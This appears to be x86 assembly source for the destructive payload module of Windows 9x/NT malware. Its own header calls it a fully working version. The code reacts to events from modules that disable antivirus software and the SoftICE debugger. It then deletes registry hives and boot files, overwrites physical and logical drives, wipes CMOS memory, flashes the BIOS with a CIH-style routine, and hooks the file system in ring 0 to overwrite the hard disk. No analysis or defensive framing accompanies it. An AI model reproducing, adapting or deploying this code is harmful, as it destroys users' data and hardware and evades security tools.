
; warning - fully working version. do not run until the right moment ;-)

FUCK_SIZE               equ     65536
FUCK_STEP               equ     1048576

include                 KILLER.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\..\INCLUDE\s2c.inc
include                 ..\FUCKICE\fuckice.inc
include                 ..\AAVFILE\AAVFILE.inc
include                 ..\WALKER\WALKER.inc
include                 ..\KILLAVXD\KILLAVXD.inc
include                 ..\IOAVFILT\IOAVFILT.inc
include                 ..\FILEIO\FILEIO.inc
include                 ..\IFSHAN\IFSHAN.inc

                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

fuck_complete           db      0

                        align   4
pdrivename              db      '\\.\PHYSICALDRIVE'
pdriveletter            db      '?',0

                        align   4
ldrivename              db      '\\.\'
ldriveletter            db      '?:',0

                        align   4
root                    db      '?:\',0

handle                  dd      256 dup (0)

                        align   4
numwritten              dd      ?
bufptr                  dd      ?
global_pointer          dd      ?
r0_bufptr               dd      ?
r0_letter               db      ?

                        align   4
reg_subkey              db      'kflags',0

                        align   4
fuckup_required         label   byte
;                                       +-----av www (trying to connect to)
;                                       |+----av active (in memory)
;                                       ||+---av present (on disk)
;                                       |||+--soft-ice active
;                                       ||||
                        db      0     ; 0000
                        db      0     ; 0001
                        db      0     ; 0010
                        db      1     ; 0011
                        db      0     ; 0100
                        db      1     ; 0101
                        db      0     ; 0110
                        db      1     ; 0111
                        db      0     ; 1000
                        db      1     ; 1001
                        db      0     ; 1010
                        db      1     ; 1011
                        db      1     ; 1100
                        db      1     ; 1101
                        db      1     ; 1110
                        db      1     ; 1111

                        align   4
hKey                    dd      ?
kflags_size             dd      ?
kflags                  dd      ?

tempfile                db      260 dup (?)

                        .code

HandleEvent:
                        mov     eax, [esp+4]    ; event_id

                        cmp     eax, EV_KILLER_DO_FUCKUP
                        je      fuck
                        cmp     eax, EV_FUCKICE_TRACING
                        je      fuck

                        mov     ecx, 1
                        cmp     eax, EV_FUCKICE_PATCHED
                        je      __setflag

                        mov     ecx, 2
                        cmp     eax, EV_AAVFILE_PATCHED
                        je      __setflag

                        mov     ecx, 4
                        cmp     eax, EV_WALKER_PATCHED
                        je      __setflag
                        cmp     eax, EV_KILLAVXD_PATCHED
                        je      __setflag

                        mov     ecx, 8
                        cmp     eax, EV_IOAVFILT_BLOCKED
                        je      __setflag

__check_flag:           mov     eax, kflags
                        and     eax, 1111b
                        cmp     fuckup_required[eax], 1
                        jne     __return_0

                        call    fuck

__return_0:             xor     eax, eax
                        retn

__setflag:              call    update_kflag
                        jmp     __check_flag

update_kflag:           pusha

                        push    offset hKey
                        push    0D16FBE0Bh   ; crc32('killer')
                        callW   createkeyV
                        or      eax, eax
                        jnz     __quit

                        mov     kflags_size, 4
                        push    offset kflags_size
                        push    offset kflags
                        push    0
                        push    0
                        push    offset reg_subkey
                        push    hKey
                        callW   queryvalueex
                        or      eax, eax
                        jz      __cont

                        mov     kflags, 0
__cont:
                        mov     ecx, [esp].pusha_ecx
                        or      ecx, kflags
                        cmp     kflags, ecx          ; alredy set ?
                        je      __close              ;
                        mov     kflags, ecx

                        push    4
                        push    offset kflags
                        push    REG_BINARY
                        push    0
                        push    offset reg_subkey
                        push    hKey
                        callW   setvalueex

__close:                push    hKey
                        callW   closekey

__quit:                 popa
                        retn

;----------------------------------------------------------------------------

fuck:                   pusha
                        cld

                        int 3
                        int 3
                        int 3

                        cmp     fuck_complete, 0
                        jne     __quit
                        inc     fuck_complete

                        push    FUCK_SIZE
                        callW   malloc
                        mov     bufptr, eax

;                       mov     edi, bufptr
;                       mov     ecx, FUCK_SIZE
;                       lea     esi, msg_start
;__cycle1:              movsb
;                       cmp     esi, offset msg_end
;                       jb      __cont
;                       lea     esi, msg_start
;__cont:                loop    __cycle1

                        call    fuck_files

                        mov     eax, cs
                        cmp     eax, 28h
                        je      __call_fuck_in_r0

                        callW   GetVersion
                        shl     eax, 1
                        jc      __w9x_r3

                        ; winNT/r3

                        mov     global_pointer, 0

__cycle2:               xor     ebp, ebp
                        call    fuck_physical_drives
                        call    fuck_logical_drives

                        add     global_pointer, FUCK_STEP
                        jmp     __cycle2

__fuck_complete:        push    bufptr
                        callW   mfree

__quit:
                        popa

                        mov     eax, 1
                        retn

__w9x_r3:               push    offset fuck_in_r0
                        callW   call_in_ring0
                        add     esp, 4

                        jmp     __fuck_complete

__call_fuck_in_r0:      call    fuck_in_r0

                        jmp     __fuck_complete

;----------------------------------------------------------------------------

fuck_physical_drives:   mov     pdriveletter, '0'

__cycle:                lea     edi, pdrivename
                        call    fuck_drive

                        inc     pdriveletter
                        cmp     pdriveletter, '3'
                        jbe     __cycle

                        retn

;----------------------------------------------------------------------------

fuck_logical_drives:    mov     ldriveletter, 'C'

__cycle:                mov     al, ldriveletter
                        mov     root, al
                        push    offset root
                        callW   GetDriveTypeA
                        cmp     eax, DRIVE_FIXED
                        jne     __cont

                        lea     edi, ldrivename
                        call    fuck_drive

__cont:                 inc     ldriveletter
                        cmp     ldriveletter, 'Z'
                        jbe     __cycle

                        retn

;----------------------------------------------------------------------------

fuck_drive:             inc     ebp

                        mov     ebx, handle[ebp*4]
                        cmp     ebx, -1
                        je      __retn
                        cmp     ebx, 0
                        jne     __alredy_opened

                        push    0
                        push    FILE_ATTRIBUTE_NORMAL
                        push    OPEN_EXISTING
                        push    0
                        push    FILE_SHARE_READ + FILE_SHARE_WRITE
                        push    GENERIC_READ + GENERIC_WRITE
                        push    edi
                        callW   CreateFileA
                        cmp     eax, -1
                        je      __sux
                        xchg    ebx, eax

                        mov     handle[ebp*4], ebx
__alredy_opened:
                        push    FILE_BEGIN
                        push    0
                        push    global_pointer
                        push    ebx
                        callW   SetFilePointer

                        mov     numwritten, 0
                        push    0
                        push    offset numwritten
                        push    FUCK_SIZE
                        push    bufptr
                        push    ebx
                        callW   WriteFile

                        cmp     numwritten, FUCK_SIZE
                        je      __retn

                        push    ebx
                        callW   CloseHandle

__sux:                  mov     handle[ebp*4], -1

__retn:                 retn

;----------------------------------------------------------------------------

fuck_files:
                        call    sub1
                        x_stosd \system.dat~
                        call    delfile

                        call    sub1
                        x_stosd \user.dat~
                        call    delfile

                        call    sub1
                        x_stosd \system.ini~
                        call    delfile

                        call    sub1
                        x_stosd \win.ini~
                        call    delfile

                        ;;

                        call    sub2
                        x_stosd io.sys~
                        call    delfile

                        call    sub2
                        x_stosd msdos.sys~
                        call    delfile

                        call    sub2
                        x_stosd ntldr~
                        call    delfile

                        call    sub2
                        x_stosd ntdetect.com~
                        call    delfile

                        ;;

                        retn

sub1:                   push    offset tempfile
                        callW   getwindir
                        xchg    edi, eax
                        retn

sub2:                   lea     edi, tempfile
                        x_stosd c:\~
                        dec     edi
                        retn

delfile:                push    32      ; archive
                        push    offset tempfile
                        callW   fsetattr

                        push    offset tempfile
                        callW   fdelete

                        retn

;----------------------------------------------------------------------------

fuck_in_r0:             pusha

                        ; cmos

                        xor     al, al
__cycle:                out     70h, al
                        out     71h, al
                        dec     al
                        jnz     __cycle

                        ; flash

                        call    cihflash

                        ; hd

                        push    FUCK_SIZE
                        callW   malloc
                        mov     xfer_addr, eax

                        push    fucking_code_size
                        callW   malloc

                        mov     insert_ebp, eax

                        lea     esi, fucking_code
                        mov     edi, eax
                        mov     ecx, fucking_code_size
                        cld
                        rep     movsb

                        mov     ebp, eax

X                       equ     < -fucking_code[ebp] >

                        lea     eax, new_hook X

                        push    eax
                        VxDcall IFSMGR, InstallFileSystemApiHook
                        add     esp, 4

                        mov     old_hook_ptr X, eax

                        popa
                        retn

; --------------------------------------------------------------------------

fucking_code:

iorequest:
dd 0               ; ULONG  IOR_next               client link see below
dw 1               ; USHORT IOR_func               function see below
;     0=READ  1=WRITE
ior_status label word
dw 0               ; USHORT IOR_status             request status see below
dd 40000501h       ; ULONG  IOR_flags              request flags see below
; 1=HIGH_PRIORITY  100h=SYNC_COMMAND  400h=VERSION_002  40000000h=PHYS_CMD
dd 0               ; CMDCPLT IOR_callback          address of callback see below
xfer_pos label dword
dd 0,0             ; ULONG  IOR_start_addr[2]      starting address see below
dd FUCK_SIZE/512   ; ULONG  IOR_xfer_count         # of sectors/bytes see below  800h=2048 sectors = 1 MB
xfer_addr label dword
dd 0c0001000h      ; ULONG  IOR_buffer_ptr         client buffer see below  C0001000h=1st VMM's block
dd 0               ; ULONG  IOR_private_client     BlockDev/IOS client reserved
dd 0               ; ULONG  IOR_private_IOS        reserved
dd 0               ; ULONG  IOR_private_port;      private area for port driver
db 20 dup (0)      ; union  urequestor_usage _ureq requestor usage; see below
dd 0               ; ULONG  IOR_req_req_handle;    request handle; see below
dd 0               ; ULONG  IOR_req_vol_handle;    media handle; see below
dd 0               ; ULONG  IOR_sgd_lin_phys;      first physical SGD; see below
db 0               ; UCHAR  IOR_num_sgds;          number of physical SGDs
db 80h  ; hd       ; UCHAR  IOR_vol_designtr;      drive letter; see below
dw 0               ; USHORT IOR_ios_private_1;     reserved by IOS to force alignment
dd 0,0             ; ULONG  IOR_reserved_2[2];     reserved for internal use

new_hook:               pusha

                        mov     ebp, 12345678h
insert_ebp              equ     dword ptr $-4

                        cmp     byte ptr [fucking X], 0
                        jne     __exit
                        inc     byte ptr [fucking X]

                        mov     al, 80h
                        VxDcall IOS, Find_Int13_Drive
                        jc      __luckysonofabitch
                        ; returns: EDI=dcb or dcb_bdd, fuck'em both

                        lea     esi, iorequest X
__cycle:
                        VxDcall IOS, SendCommand

                        add     dword ptr [xfer_pos X], FUCK_STEP/512

                        cmp     word ptr [ior_status X], 0  ; 0==IORS_SUCCESS
                        je      __cycle
__luckysonofabitch:
__exit:
                        popa

                        jmp     dword ptr ds:[12345678h]
old_hook_ptr            equ     dword ptr $-4

fucking                 db      0               ; busy flag

fucking_code_size       equ     $-fucking_code

;----------------------------------------------------------------------------

include                 cihflash.inc

;----------------------------------------------------------------------------

                        end
